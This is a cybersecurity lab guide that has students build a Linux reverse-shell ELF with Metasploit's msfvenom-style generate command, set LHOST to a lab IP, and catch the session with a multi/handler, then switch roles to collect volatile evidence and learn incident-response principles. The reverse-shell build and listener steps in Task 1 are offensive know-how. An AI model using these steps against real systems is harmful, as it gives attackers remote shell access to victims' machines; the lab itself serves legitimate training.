📋 Overview

The whole security story in one lab: attack, then response.

You first stage a compromise — build a Linux reverse-shell executable, host it, and catch the session with a Metasploit handler (the Linux twin of Lab 01). Then you switch hats to incident responder and collect volatile data from the compromised host, building a timestamped report. The responder's half carries the real lesson: the IR lifecycle and the order of volatility — grab the evidence that disappears first.

[THE ONE IDEA] Order of volatility. Running processes, network connections, and memory vanish on reboot or with time; disk persists. Collect the fleeting evidence first, and document every step so the record holds up.

Task 1

Build Malicious Executables to Attack a Remote System

Task 1.1

Build Malicious Linux Executable

1 Launch the Kali virtual machine to access the graphical login screen.

2 Log in as username kali with kali as the password.

3 Click on the terminal icon located in the top menu bar.

4 For the purpose of learning how to build a malicious Linux executable file and incidence response, we will ignore the social engineering process. Now, let's build a malicious Linux executable. First, we will create a directory to place the executable in. In the Terminal window, as shown below, type the command mkdir malicious and then press Enter. Then, cd malicious to go into the directory.

5 While inside the malicious directory, type and run the command msfconsole to start Metasploit. kali@kali $ msfconsole

6 Type the following command to search for the payload for the 64-bit Linux operating system. kali@kali $ search linux/x64/shell_reverse_tcp

7 Type use 0 to use the payload. Notice the prompt now says payload(linux/x64/shell_reverse_tcp). This indicates that we are using this payload now.

8 We will then see what options are available by running the command show options. We can see there are two options available: LHOST and LPORT. Currently, LPORT is set, and we need to configure the LHOST.

9 Type command set LHOST 203.0.113.2 to set the local listen address.

10 With everything set and ready, let's create the malicious executable. Type the command below: kali@kali $ generate -f elf -o linux

11 A file named linux is created inside the malicious directory. Before we offer the malicious executable to the victim, let's prepare a listener first. In your Metasploit console, type the command below to use a handler. kali@kali $ use exploit/multi/handler

12 Notice from the last step, it prompted that the payload is defaulting to generic/shell_reverse_tcp. This payload will not handle our linux reverse shell, so let's change it by entering the following command: kali@kali $ set payload linux/x64/shell_reverse_tcp

13 Once again, we will check the options. Notice the payload is correct now, but we still need to change the LHOST.

14 Type the same command as we did before to change the LHOST.

[NOTE] You can use setg LHOST local.ip.address.here to save the time on configuring the LHOST addresses. The setg will set the LHOST as a global variable. So, when its set, every module, payload that accepts LHOST will refer to the same entry.

15 We will now run the handler to wait for a reverse connection. Run the command exploit and leave the Terminal window open.

Task 2

Collecting Volatile Data

Task 2.1

Collecting Volatile Data on a Compromised System

1 Once a system has been compromised, it is important to get some information off the system before it is shut down. Any data residing in RAM will be gone when the system is shut down. Change focus to the UbuntuSRV system

2 On the UbuntuSRV system, in the Terminal that still has the malicious executable running, click the + new tab button.

3 In the new Terminal tab, enter the command sudo su to escalate to root privileges. If prompted, enter NDGlabpass123! as the password.

4 Create a file to contain any volatile data we can find. To put a heading into the file, enter the command below.

root@ubuntusrv:/home/sysadmin/Downloads# echo sysadmin investigator > report.txt

5 Verify the report.txt file has been created with the student investigator title.

root@ubuntusrv:/home/sysadmin/Downloads# cat report.txt

6 Add the date and timestamp to the report.txt file.

root@ubuntusrv:/home/sysadmin/Downloads# date >> report.txt

7 Print the system information to the report.txt file.

root@ubuntusrv:/home/sysadmin/Downloads# uname -a >> report.txt

8 Add the hostname to the report.txt file.

root@ubuntusrv:/home/sysadmin/Downloads# hostname >> report.txt

9 Append network interface information to the report.txt file.

root@ubuntusrv:/home/sysadmin/Downloads# ifconfig -a >> report.txt

10 Append network statistics to the report.txt file.

root@ubuntusrv:/home/sysadmin/Downloads# netstat -ano >> report.txt

11 Append the process services running to the report.txt file.

root@ubuntusrv:/home/sysadmin/Downloads# ps -aux >> report.txt

12 Append the routing table to the report.txt file.

root@ubuntusrv:/home/sysadmin/Downloads# route -n >> report.txt

13 Append the date and timestamp to the report.txt once more at the end of the file.

root@ubuntusrv:/home/sysadmin/Downloads# date >> report.txt

14 View output content from the report.txt. Press the spacebar to scroll down by page or press Enter to scroll down by a single line.

root@ubuntusrv:/home/sysadmin/Downloads# cat report.txt | less

15 When finished reviewing the contents, press Q to exit.

16 Leave the Terminal shell open to continue with the next task.

Viewing Logs

Task 3.1

Analyzing Different Log File and Knowing Their Importance

⚠️ Where students get stuck

The two-hats confusion and the responder discipline.

[DON'T CONFLATE THE ROLES] Phase 1 is the attacker creating the incident; Phase 2 is you responding. Keep them separate in your head — the learning is in Phase 2.
[THE SHELL SHOWS IN netstat] The reverse shell is a live connection — netstat reveals it. That's the responder finding the attacker's foothold.
[VOLATILE DATA FIRST] Memory, connections, and processes are gone after a reboot. Collect them before anything that would disturb them — order of volatility is the exam point.
[TIMESTAMP EVERYTHING] Start the report with date. Undocumented evidence with no timeline is weak evidence — this is the beginning of chain of custody.
[COLLECT AS ROOT, CAREFULLY] You need privilege to see everything, but every action on a live system risks altering it. Touch as little as possible and record what you do.

🛡️ The defender's view

The response half is pure blue team — here's the framework behind it.

An IR plan / playbook

Breaks: chaos during a real incident

Prepare, Identify, Contain, Eradicate, Recover, Lessons Learned — a documented, rehearsed process so responders act decisively instead of improvising under pressure.

Order of volatility

Breaks: lost evidence

Collect the most fleeting data first — memory, network connections, running processes — before the persistent disk, because a reboot or delay destroys the volatile sources.

Documentation & timestamps

Breaks: unusable findings

Every action and finding, timed and recorded. The report is the evidence; an undocumented investigation can't support containment decisions or hold up later.

Chain of custody

Breaks: inadmissible evidence

Track who handled what and when. If an incident becomes legal, the integrity of the evidence trail is what makes it stand.

Forensic soundness

Breaks: trampled evidence

Every command on a live host changes it. Minimize impact, prefer read-only collection, and know that volatile capture is a trade-off between completeness and preservation.

Detection feeds IR

Breaks: no trigger

Incidents start with an alert — the NIDS/HIDS lab is the front end to this one. Good monitoring is what makes timely response possible.

✅ Check yourself

1. What is the 'order of volatility' and why does it drive evidence collection?

It's the principle that some evidence disappears faster than others — memory, network connections, and running processes vanish on reboot or with time, while disk persists. So you collect the most volatile sources first, before they're lost.

2. Which command in the response reveals the attacker's live foothold, and why?

netstat — it lists active network connections, so the reverse shell's open connection back to the attacker appears there. It's a volatile artifact, which is why it's collected early.

3. Why start the report with date and document every action?

To anchor every finding in time and build an accountable record — the start of chain of custody. Undocumented, untimed evidence is weak and may be unusable if the incident escalates to legal action.

4. Name the phases of the incident-response lifecycle.

Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned. This lab practices identification and evidence collection; a full response works through all six.
